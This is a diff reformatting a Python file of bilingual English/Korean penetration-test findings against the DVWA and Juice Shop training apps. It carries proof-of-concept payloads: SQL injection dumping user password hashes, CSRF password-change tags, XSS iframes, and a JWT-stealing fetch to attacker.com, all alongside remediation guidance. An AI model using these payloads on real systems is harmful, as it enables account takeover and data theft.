@@ -174,11 +174,15 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: ORM adoption, least-privilege DB accounts, bcrypt password hashing.|||장기: ORM 레이어 도입, 최소 권한 DB 계정 적용(읽기 전용, 단일 데이터베이스), MD5에서 bcrypt/argon2로 비밀번호 해싱 마이그레이션, 애플리케이션 레이어 입력 검증 추가."
         ),
         references=[
-            Reference(title="OWASP SQL Injection", url="https://owasp.org/www-community/attacks/SQL_Injection"),
-            Reference(title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"),
+            Reference(
+                title="OWASP SQL Injection",
+                url="https://owasp.org/www-community/attacks/SQL_Injection",
+            ),
+            Reference(
+                title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"
+            ),
         ],
     ),
-
     # ---- 2. Command Injection ----
     Finding(
         id="DVWA-002",
@@ -316,11 +320,16 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: Replace shell_exec with native PHP, container isolation, AppArmor.|||장기: shell_exec()을 네이티브 PHP 소켓 함수로 교체, 아웃바운드 네트워크 접근 차단 컨테이너 격리, AppArmor/SELinux 강제 접근 제어 배포, 허용 목록(Allowlist) 전용 입력 검증."
         ),
         references=[
-            Reference(title="OWASP Command Injection", url="https://owasp.org/www-community/attacks/Command_Injection"),
-            Reference(title="CWE-78: OS Command Injection", url="https://cwe.mitre.org/data/definitions/78.html"),
+            Reference(
+                title="OWASP Command Injection",
+                url="https://owasp.org/www-community/attacks/Command_Injection",
+            ),
+            Reference(
+                title="CWE-78: OS Command Injection",
+                url="https://cwe.mitre.org/data/definitions/78.html",
+            ),
         ],
     ),
-
     # ---- 3. Reflected XSS ----
     Finding(
         id="DVWA-003",
@@ -435,11 +444,16 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: CSP header, auto-escaping template engine, SameSite=Strict.|||장기: Content-Security-Policy 헤더 구현 (script-src 'self'), 자동 이스케이핑(Auto-escaping) 템플릿 엔진(Twig, Blade) 배포, SameSite=Strict 쿠키 속성 추가."
         ),
         references=[
-            Reference(title="OWASP XSS Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
-            Reference(title="CWE-79: Cross-site Scripting", url="https://cwe.mitre.org/data/definitions/79.html"),
+            Reference(
+                title="OWASP XSS Prevention",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+            ),
+            Reference(
+                title="CWE-79: Cross-site Scripting",
+                url="https://cwe.mitre.org/data/definitions/79.html",
+            ),
         ],
     ),
-
     # ---- 4. SSRF/LFI ----
     Finding(
         id="DVWA-004",
@@ -572,11 +586,16 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: Routing framework, open_basedir restriction.|||장기: 페이지 식별자를 컨트롤러 클래스에 매핑하는 라우팅 프레임워크(Routing Framework)로 리팩토링, PHP open_basedir 제한 활성화."
         ),
         references=[
-            Reference(title="OWASP LFI", url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"),
-            Reference(title="CWE-98: PHP File Inclusion", url="https://cwe.mitre.org/data/definitions/98.html"),
+            Reference(
+                title="OWASP LFI",
+                url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
+            ),
+            Reference(
+                title="CWE-98: PHP File Inclusion",
+                url="https://cwe.mitre.org/data/definitions/98.html",
+            ),
         ],
     ),
-
     # ---- 5. Missing Security Headers ----
     Finding(
         id="DVWA-005",
@@ -612,12 +631,12 @@ DVWA_FINDINGS: list[Finding] = [
             "FIX — Remediation\n"
             "Immediate: Add all 7 headers via Apache/Nginx configuration:\n"
             "  Header set Content-Security-Policy \"default-src 'self'; script-src 'self'\"\n"
-            "  Header set X-Frame-Options \"DENY\"\n"
-            "  Header set X-Content-Type-Options \"nosniff\"\n"
-            "  Header set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
-            "  Header set X-XSS-Protection \"1; mode=block\"\n"
-            "  Header set Referrer-Policy \"strict-origin-when-cross-origin\"\n"
-            "  Header set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n"
+            '  Header set X-Frame-Options "DENY"\n'
+            '  Header set X-Content-Type-Options "nosniff"\n'
+            '  Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"\n'
+            '  Header set X-XSS-Protection "1; mode=block"\n'
+            '  Header set Referrer-Policy "strict-origin-when-cross-origin"\n'
+            '  Header set Permissions-Policy "camera=(), microphone=(), geolocation=()"\n'
             "Short-term: Add headers at the application level in PHP.\n"
             "Long-term: Implement a reverse proxy (e.g., Nginx) that enforces headers for all applications.\n\n"
             "ATTACK PATH — Chain Analysis\n"
@@ -652,12 +671,12 @@ DVWA_FINDINGS: list[Finding] = [
             "수정 방안(FIX)\n"
             "즉시: Apache/Nginx 설정에서 7개 보안 헤더 추가:\n"
             "  Header set Content-Security-Policy \"default-src 'self'; script-src 'self'\"\n"
-            "  Header set X-Frame-Options \"DENY\"\n"
-            "  Header set X-Content-Type-Options \"nosniff\"\n"
-            "  Header set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
-            "  Header set X-XSS-Protection \"1; mode=block\"\n"
-            "  Header set Referrer-Policy \"strict-origin-when-cross-origin\"\n"
-            "  Header set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n"
+            '  Header set X-Frame-Options "DENY"\n'
+            '  Header set X-Content-Type-Options "nosniff"\n'
+            '  Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"\n'
+            '  Header set X-XSS-Protection "1; mode=block"\n'
+            '  Header set Referrer-Policy "strict-origin-when-cross-origin"\n'
+            '  Header set Permissions-Policy "camera=(), microphone=(), geolocation=()"\n'
             "단기: PHP 애플리케이션 레벨에서 헤더 추가.\n"
             "장기: 모든 애플리케이션에 대해 헤더를 적용하는 리버스 프록시(예: Nginx) 구현.\n\n"
             "공격 경로(ATTACK PATH) — 체인 분석\n"
@@ -703,10 +722,11 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: Reverse proxy for centralized header enforcement.|||장기: 모든 애플리케이션에 대해 보안 헤더를 일괄 적용하는 리버스 프록시(Reverse Proxy) 구현을 통한 중앙 집중식 헤더 관리."
         ),
         references=[
-            Reference(title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"),
+            Reference(
+                title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"
+            ),
         ],
     ),
-
     # ---- 6. CSRF ----
     Finding(
         id="DVWA-006",
@@ -720,7 +740,7 @@ DVWA_FINDINGS: list[Finding] = [
             "This allows an attacker to forge a request that changes the victim's password without their knowledge.\n\n"
             "HOW — Step-by-Step Attack Scenario\n"
             "Step 1: Attacker crafts an HTML page with a hidden image tag or auto-submitting form:\n"
-            "  <img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\" width=\"0\" height=\"0\">\n"
+            '  <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">\n'
             "Step 2: Attacker hosts the page or embeds it in a forum post / email\n"
             "Step 3: Authenticated DVWA user visits the attacker's page\n"
             "Step 4: Browser automatically sends the GET request with the victim's PHPSESSID cookie\n"
@@ -735,7 +755,7 @@ DVWA_FINDINGS: list[Finding] = [
             "Attacker's malicious page:\n"
             "<html><body>\n"
             "<h1>Click here to win a prize!</h1>\n"
-            "<img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\" style=\"display:none\">\n"
+            '<img src="http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" style="display:none">\n'
             "</body></html>\n\n"
             "When victim visits this page while logged into DVWA, their password is changed to 'pwned'.\n\n"
             "FIX — Remediation\n"
@@ -756,7 +776,7 @@ DVWA_FINDINGS: list[Finding] = [
             "이를 통해 공격자가 피해자의 인지 없이 비밀번호를 변경하는 위조된 요청을 생성할 수 있습니다.\n\n"
             "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
             "1단계: 공격자가 숨겨진 이미지 태그 또는 자동 제출 폼이 포함된 HTML 페이지 생성:\n"
-            "  <img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\" width=\"0\" height=\"0\">\n"
+            '  <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">\n'
             "2단계: 공격자가 페이지를 호스팅하거나 포럼 게시물/이메일에 삽입\n"
             "3단계: DVWA에 인증된 사용자가 공격자의 페이지 방문\n"
             "4단계: 브라우저가 피해자의 PHPSESSID 쿠키와 함께 자동으로 GET 요청 전송\n"
@@ -771,7 +791,7 @@ DVWA_FINDINGS: list[Finding] = [
             "공격자의 악성 페이지:\n"
             "<html><body>\n"
             "<h1>Click here to win a prize!</h1>\n"
-            "<img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\" style=\"display:none\">\n"
+            '<img src="http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" style="display:none">\n'
             "</body></html>\n\n"
             "피해자가 DVWA에 로그인된 상태에서 이 페이지를 방문하면 비밀번호가 'pwned'로 변경됩니다.\n\n"
             "수정 방안(FIX)\n"
@@ -826,11 +846,13 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: Framework-level CSRF protection.|||장기: 내장 CSRF 보호 기능이 있는 프레임워크(Laravel, Symfony) 도입, 심층 방어로 이중 제출 쿠키 패턴(Double-submit Cookie Pattern) 구현."
         ),
         references=[
-            Reference(title="OWASP CSRF Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
+            Reference(
+                title="OWASP CSRF Prevention",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+            ),
             Reference(title="CWE-352: CSRF", url="https://cwe.mitre.org/data/definitions/352.html"),
         ],
     ),
-
     # ---- 7. Information Disclosure ----
     Finding(
         id="DVWA-007",
@@ -933,7 +955,10 @@ DVWA_FINDINGS: list[Finding] = [
             "Long-term: Reverse proxy stripping identification headers.|||장기: 모든 서버 식별 헤더를 제거하는 리버스 프록시(Reverse Proxy) 뒤에 배포, 내부 경로를 노출하지 않는 사용자 정의 오류 페이지 구현."
         ),
         references=[
-            Reference(title="CWE-200: Exposure of Sensitive Information", url="https://cwe.mitre.org/data/definitions/200.html"),
+            Reference(
+                title="CWE-200: Exposure of Sensitive Information",
+                url="https://cwe.mitre.org/data/definitions/200.html",
+            ),
         ],
     ),
 ]
@@ -953,7 +978,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "WHAT — Vulnerability Description\n"
             "The product search endpoint at /rest/products/search?q= is vulnerable to SQL injection against the SQLite backend. "
             "The application uses Sequelize ORM but constructs a raw query for the search feature: "
-            "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\" + criteria + \"%') OR ...)\"). "
+            'models.sequelize.query("SELECT * FROM Products WHERE ((name LIKE \'%" + criteria + "%\') OR ...)"). '
             "This allows an attacker to break out of the LIKE clause and inject UNION SELECT statements to extract data "
             "from any table in the SQLite database, including the Users table containing email addresses and bcrypt password hashes.\n\n"
             "HOW — Step-by-Step Attack Scenario\n"
@@ -974,9 +999,9 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "PoC — Proof of Concept\n"
             "Request: GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users--\n"
             "Response (JSON):\n"
-            "  {\"id\":1,\"name\":\"admin@juice-sh.op\",\"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...\",\"price\":\"admin\"}\n"
-            "  {\"id\":2,\"name\":\"jim@juice-sh.op\",\"description\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\"price\":\"customer\"}\n"
-            "  {\"id\":3,\"name\":\"bender@juice-sh.op\",\"description\":\"$2a$12$mZeJ7MJX...\",\"price\":\"customer\"}\n\n"
+            '  {"id":1,"name":"admin@juice-sh.op","description":"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...","price":"admin"}\n'
+            '  {"id":2,"name":"jim@juice-sh.op","description":"$2a$12$0gKjvM6vSFHXGhIm...","price":"customer"}\n'
+            '  {"id":3,"name":"bender@juice-sh.op","description":"$2a$12$mZeJ7MJX...","price":"customer"}\n\n'
             "FIX — Remediation\n"
             "Immediate: Replace the raw SQL query with Sequelize ORM query: Products.findAll({ where: { name: { [Op.like]: '%' + criteria + '%' } } })\n"
             "Short-term: Implement input validation — reject search queries containing SQL keywords and special characters.\n"
@@ -989,7 +1014,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "취약점 설명(WHAT)\n"
             "/rest/products/search?q= 제품 검색 엔드포인트가 SQLite 백엔드에 대한 SQL 인젝션(SQL Injection)에 취약합니다. "
             "애플리케이션은 Sequelize ORM을 사용하지만 검색 기능에서 raw query를 직접 구성합니다: "
-            "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\" + criteria + \"%') OR ...)\"). "
+            'models.sequelize.query("SELECT * FROM Products WHERE ((name LIKE \'%" + criteria + "%\') OR ...)"). '
             "이로 인해 공격자가 LIKE 절을 벗어나 UNION SELECT 구문을 주입하여 "
             "이메일 주소와 bcrypt 비밀번호 해시를 포함한 Users 테이블 등 SQLite 데이터베이스의 모든 테이블에서 데이터를 추출할 수 있습니다.\n\n"
             "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
@@ -1010,9 +1035,9 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "개념 증명(PoC)\n"
             "요청: GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users--\n"
             "응답 (JSON):\n"
-            "  {\"id\":1,\"name\":\"admin@juice-sh.op\",\"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...\",\"price\":\"admin\"}\n"
-            "  {\"id\":2,\"name\":\"jim@juice-sh.op\",\"description\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\"price\":\"customer\"}\n"
-            "  {\"id\":3,\"name\":\"bender@juice-sh.op\",\"description\":\"$2a$12$mZeJ7MJX...\",\"price\":\"customer\"}\n\n"
+            '  {"id":1,"name":"admin@juice-sh.op","description":"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...","price":"admin"}\n'
+            '  {"id":2,"name":"jim@juice-sh.op","description":"$2a$12$0gKjvM6vSFHXGhIm...","price":"customer"}\n'
+            '  {"id":3,"name":"bender@juice-sh.op","description":"$2a$12$mZeJ7MJX...","price":"customer"}\n\n'
             "수정 방안(FIX)\n"
             "즉시: raw SQL 쿼리를 Sequelize ORM 쿼리로 교체: Products.findAll({ where: { name: { [Op.like]: '%' + criteria + '%' } } })\n"
             "단기: 입력 검증(Input Validation) 구현 — SQL 키워드 및 특수 문자가 포함된 검색 쿼리 거부.\n"
@@ -1049,18 +1074,18 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
                     "GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users-- HTTP/1.1\n"
                     "Host: localhost:3000\n\n"
                     "--- RESPONSE (200 OK) ---\n"
-                    "{\"status\":\"success\",\"data\":[{\n"
-                    "  \"id\":1,\"name\":\"admin@juice-sh.op\",\n"
-                    "  \"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS3Hg4pO2SxKzLwJiMHTRqJv1FZe\",\n"
-                    "  \"price\":\"admin\"\n"
+                    '{"status":"success","data":[{\n'
+                    '  "id":1,"name":"admin@juice-sh.op",\n'
+                    '  "description":"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS3Hg4pO2SxKzLwJiMHTRqJv1FZe",\n'
+                    '  "price":"admin"\n'
                     "},{\n"
-                    "  \"id\":2,\"name\":\"jim@juice-sh.op\",\n"
-                    "  \"description\":\"$2a$12$0gKjvM6vSFHXGhIm5y1pneNOgqr1N7qJkSFW3hB6dMJ2y5zqVKG\",\n"
-                    "  \"price\":\"customer\"\n"
+                    '  "id":2,"name":"jim@juice-sh.op",\n'
+                    '  "description":"$2a$12$0gKjvM6vSFHXGhIm5y1pneNOgqr1N7qJkSFW3hB6dMJ2y5zqVKG",\n'
+                    '  "price":"customer"\n'
                     "},{\n"
-                    "  \"id\":3,\"name\":\"bender@juice-sh.op\",\n"
-                    "  \"description\":\"$2a$12$mZeJ7MJXsDe0v3GNMW7NKuL7sEPx5vCg\",\n"
-                    "  \"price\":\"customer\"\n"
+                    '  "id":3,"name":"bender@juice-sh.op",\n'
+                    '  "description":"$2a$12$mZeJ7MJXsDe0v3GNMW7NKuL7sEPx5vCg",\n'
+                    '  "price":"customer"\n'
                     "}]}"
                 ),
             ),
@@ -1071,11 +1096,15 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Long-term: WAF, query logging, comprehensive code audit.|||장기: SQL 인젝션 시그니처 매칭 WAF 배포, Sequelize 쿼리 로깅 및 이상 탐지 활성화, 전체 애플리케이션 raw query 사용에 대한 포괄적 코드 감사(Code Audit) 수행."
         ),
         references=[
-            Reference(title="OWASP SQL Injection", url="https://owasp.org/www-community/attacks/SQL_Injection"),
-            Reference(title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"),
+            Reference(
+                title="OWASP SQL Injection",
+                url="https://owasp.org/www-community/attacks/SQL_Injection",
+            ),
+            Reference(
+                title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"
+            ),
         ],
     ),
-
     # ---- 2. Reflected XSS ----
     Finding(
         id="JUICE-002",
@@ -1089,7 +1118,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "the URL hash fragment, which Angular processes without server-side validation. "
             "This enables an attacker to inject arbitrary HTML including iframes that can execute JavaScript.\n\n"
             "HOW — Step-by-Step Attack Scenario\n"
-            "Step 1: Inject iframe payload via search: /#/search?q=<iframe src=\"javascript:alert(document.cookie)\">\n"
+            'Step 1: Inject iframe payload via search: /#/search?q=<iframe src="javascript:alert(document.cookie)">\n'
             "Step 2: Angular renders the search results page with the iframe injected into the DOM\n"
             "Step 3: The iframe executes JavaScript in the context of the Juice Shop origin\n"
             "Step 4: Payload reads localStorage to extract the JWT token: localStorage.getItem('token')\n"
@@ -1102,8 +1131,8 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "- Customer PII access via authenticated API endpoints\n"
             "- Stored XSS potential if search terms are logged and displayed elsewhere\n\n"
             "PoC — Proof of Concept\n"
-            "Payload: <iframe src=\"javascript:alert(`XSS`)\">\n"
-            "Full URL: http://localhost:3000/#/search?q=<iframe src=\"javascript:alert(`XSS`)\">\n"
+            'Payload: <iframe src="javascript:alert(`XSS`)">\n'
+            'Full URL: http://localhost:3000/#/search?q=<iframe src="javascript:alert(`XSS`)">\n'
             "JWT theft payload: <iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
             "FIX — Remediation\n"
             "Immediate: Move JWT storage from localStorage to HttpOnly cookies.\n"
@@ -1122,7 +1151,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Angular가 서버 측 검증 없이 이를 처리합니다. "
             "이를 통해 공격자가 JavaScript를 실행할 수 있는 iframe을 포함한 임의의 HTML을 주입할 수 있습니다.\n\n"
             "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
-            "1단계: 검색을 통한 iframe 페이로드 주입: /#/search?q=<iframe src=\"javascript:alert(document.cookie)\">\n"
+            '1단계: 검색을 통한 iframe 페이로드 주입: /#/search?q=<iframe src="javascript:alert(document.cookie)">\n'
             "2단계: Angular가 iframe이 DOM에 주입된 검색 결과 페이지를 렌더링\n"
             "3단계: iframe이 Juice Shop 오리진(Origin) 컨텍스트에서 JavaScript를 실행\n"
             "4단계: 페이로드가 localStorage를 읽어 JWT 토큰 추출: localStorage.getItem('token')\n"
@@ -1135,8 +1164,8 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "- 인증된 API 엔드포인트를 통한 고객 PII 접근\n"
             "- 검색어가 다른 곳에 로깅 및 표시될 경우 저장형 XSS(Stored XSS) 가능성\n\n"
             "개념 증명(PoC)\n"
-            "페이로드: <iframe src=\"javascript:alert(`XSS`)\">\n"
-            "전체 URL: http://localhost:3000/#/search?q=<iframe src=\"javascript:alert(`XSS`)\">\n"
+            '페이로드: <iframe src="javascript:alert(`XSS`)">\n'
+            '전체 URL: http://localhost:3000/#/search?q=<iframe src="javascript:alert(`XSS`)">\n'
             "JWT 탈취 페이로드: <iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
             "수정 방안(FIX)\n"
             "즉시: JWT 저장소를 localStorage에서 HttpOnly 쿠키로 이전.\n"
@@ -1171,16 +1200,16 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
                 evidence_type="http_request",
                 title="XSS — iframe injection with JWT theft",
                 content=(
-                    "GET /#/search?q=<iframe+src=\"javascript:alert(document.cookie)\"> HTTP/1.1\n"
+                    'GET /#/search?q=<iframe+src="javascript:alert(document.cookie)"> HTTP/1.1\n'
                     "Host: localhost:3000\n\n"
                     "--- DOM AFTER RENDERING ---\n"
-                    "<span class=\"result-heading\">\n"
-                    "  Search Results - <iframe src=\"javascript:alert(document.cookie)\"></iframe>\n"
+                    '<span class="result-heading">\n'
+                    '  Search Results - <iframe src="javascript:alert(document.cookie)"></iframe>\n'
                     "</span>\n\n"
                     "--- JWT THEFT VARIANT ---\n"
                     "<iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
                     "Attacker server log:\n"
-                    "GET /steal?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJhY3RpdmUiLCJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIn19"
+                    "GET /steal?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJhY3RpdmUiLCJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIn19"  # gitleaks:allow -- synthetic Juice Shop evidence
                 ),
             ),
         ],
@@ -1190,10 +1219,12 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Long-term: Strict CSP with frame-src 'none'.|||장기: 인라인 스크립트 및 신뢰할 수 없는 소스의 iframe을 차단하는 엄격한 Content-Security-Policy 구현 (frame-src 'none', script-src 'self')."
         ),
         references=[
-            Reference(title="OWASP XSS Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
+            Reference(
+                title="OWASP XSS Prevention",
+                url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+            ),
         ],
     ),
-
     # ---- 3. Exposed User API ----
     Finding(
         id="JUICE-003",
@@ -1223,13 +1254,13 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "PoC — Proof of Concept\n"
             "Request: GET /api/Users HTTP/1.1 (no cookies, no auth header)\n"
             "Response (200 OK):\n"
-            "  {\"data\":[{\n"
-            "    \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
-            "    \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
-            "    \"role\":\"admin\",\"totpSecret\":\"\",\n"
-            "    \"securityAnswer\":{\"answer\":\"Samuel\"}\n"
+            '  {"data":[{\n'
+            '    "id":1,"username":"","email":"admin@juice-sh.op",\n'
+            '    "password":"0192023a7bbd73250516f069df18b500",\n'
+            '    "role":"admin","totpSecret":"",\n'
+            '    "securityAnswer":{"answer":"Samuel"}\n'
             "  },{\n"
-            "    \"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",...\n"
+            '    "id":2,"email":"jim@juice-sh.op","role":"customer",...\n'
             "  }]}\n\n"
             "FIX — Remediation\n"
             "Immediate: Add authentication middleware to /api/Users route. Restrict to admin role only.\n"
@@ -1264,13 +1295,13 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "개념 증명(PoC)\n"
             "요청: GET /api/Users HTTP/1.1 (쿠키 없음, 인증 헤더 없음)\n"
             "응답 (200 OK):\n"
-            "  {\"data\":[{\n"
-            "    \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
-            "    \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
-            "    \"role\":\"admin\",\"totpSecret\":\"\",\n"
-            "    \"securityAnswer\":{\"answer\":\"Samuel\"}\n"
+            '  {"data":[{\n'
+            '    "id":1,"username":"","email":"admin@juice-sh.op",\n'
+            '    "password":"0192023a7bbd73250516f069df18b500",\n'
+            '    "role":"admin","totpSecret":"",\n'
+            '    "securityAnswer":{"answer":"Samuel"}\n'
             "  },{\n"
-            "    \"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",...\n"
+            '    "id":2,"email":"jim@juice-sh.op","role":"customer",...\n'
             "  }]}\n\n"
             "수정 방안(FIX)\n"
             "즉시: /api/Users 라우트에 인증 미들웨어(Authentication Middleware) 추가. admin 역할만 접근 가능하도록 제한.\n"
@@ -1310,16 +1341,16 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
                     "Host: localhost:3000\n"
                     "(No authentication headers)\n\n"
                     "--- RESPONSE (200 OK) ---\n"
-                    "{\"status\":\"success\",\"data\":[{\n"
-                    "  \"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\n"
-                    "  \"password\":\"0192023a7bbd73250516f069df18b500\",\n"
-                    "  \"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\n"
-                    "  \"totpSecret\":\"\",\"isActive\":true,\n"
-                    "  \"securityAnswer\":{\"id\":1,\"answer\":\"Samuel\"}\n"
+                    '{"status":"success","data":[{\n'
+                    '  "id":1,"username":"","email":"admin@juice-sh.op",\n'
+                    '  "password":"0192023a7bbd73250516f069df18b500",\n'
+                    '  "role":"admin","deluxeToken":"","lastLoginIp":"0.0.0.0",\n'
+                    '  "totpSecret":"","isActive":true,\n'
+                    '  "securityAnswer":{"id":1,"answer":"Samuel"}\n'
                     "},{\n"
-                    "  \"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\n"
-                    "  \"password\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\n"
-                    "  \"role\":\"customer\"\n"
+                    '  "id":2,"username":"","email":"jim@juice-sh.op",\n'
+                    '  "password":"$2a$12$0gKjvM6vSFHXGhIm...",\n'
+                    '  "role":"customer"\n'
                     "}]}"
                 ),
             ),
@@ -1330,11 +1361,16 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Long-term: RBAC audit across all API routes.|||장기: 모든 API 엔드포인트에 대한 포괄적 RBAC(역할 기반 접근 제어) 감사, 필드 레벨 접근 제어 시스템(DTO 변환 레이어) 도입."
         ),
         references=[
-            Reference(title="OWASP Broken Access Control", url="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"),
-            Reference(title="CWE-284: Improper Access Control", url="https://cwe.mitre.org/data/definitions/284.html"),
+            Reference(
+                title="OWASP Broken Access Control",
+                url="https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+            ),
+            Reference(
+                title="CWE-284: Improper Access Control",
+                url="https://cwe.mitre.org/data/definitions/284.html",
+            ),
         ],
     ),
-
     # ---- 4. Missing Security Headers ----
     Finding(
         id="JUICE-004",
@@ -1435,10 +1471,11 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Long-term: CSP reporting, HSTS preload.|||장기: 정책 위반 모니터링을 위한 CSP 리포팅(Reporting) 활성화, HSTS preload 목록 등록, 최소 1년 max-age HSTS 설정."
         ),
         references=[
-            Reference(title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"),
+            Reference(
+                title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"
+            ),
         ],
     ),
-
     # ---- 5. Directory Listing ----
     Finding(
         id="JUICE-005",
@@ -1567,10 +1604,12 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "Long-term: CI/CD scan for sensitive files in web root.|||장기: 공개 디렉토리의 민감한 파일을 자동으로 스캔하는 CI/CD 파이프라인 검사 구현, 웹 루트에 백업/자격증명/내부 문서 저장 금지 정책 수립."
         ),
         references=[
-            Reference(title="CWE-548: Exposure via Directory Listing", url="https://cwe.mitre.org/data/definitions/548.html"),
+            Reference(
+                title="CWE-548: Exposure via Directory Listing",
+                url="https://cwe.mitre.org/data/definitions/548.html",
+            ),
         ],
     ),
-
     # ---- 6. Broken Access Control ----
     Finding(
         id="JUICE-006",
@@ -1583,7 +1622,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
             "matches the UserId field, and in fact does not require authentication at all. Additionally, GET /api/Feedbacks returns "
             "all feedback entries including those from other users, with no access control.\n\n"
             "HOW — Step-by-Step Attack Scenario\n"
